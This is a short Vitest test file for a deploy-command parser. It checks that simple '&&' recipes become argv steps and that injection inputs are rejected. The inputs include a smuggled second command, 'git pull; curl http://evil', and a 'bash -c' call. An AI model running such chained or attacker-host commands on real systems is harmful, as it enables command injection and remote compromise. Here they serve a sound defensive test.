import { describe, expect, it } from 'vitest';
import { parseDeployCommandPlan } from './deploy-plan';

describe('deploy-plan', () => {
  it('parses simple && deploy recipes into argv command steps', () => {
    expect(parseDeployCommandPlan('git pull && npm install && pm2 restart all')).toEqual([
      { command: 'git', args: ['pull'] },
      { command: 'npm', args: ['install'] },
      { command: 'pm2', args: ['restart', 'all'] },
    ]);
  });

  it('rejects shell metacharacters and unsupported commands', () => {
    expect(() => parseDeployCommandPlan('git pull; curl http://evil')).toThrow('Unsupported shell syntax');
    expect(() => parseDeployCommandPlan('bash -c "id"')).toThrow('Unsupported deploy command');
  });
});
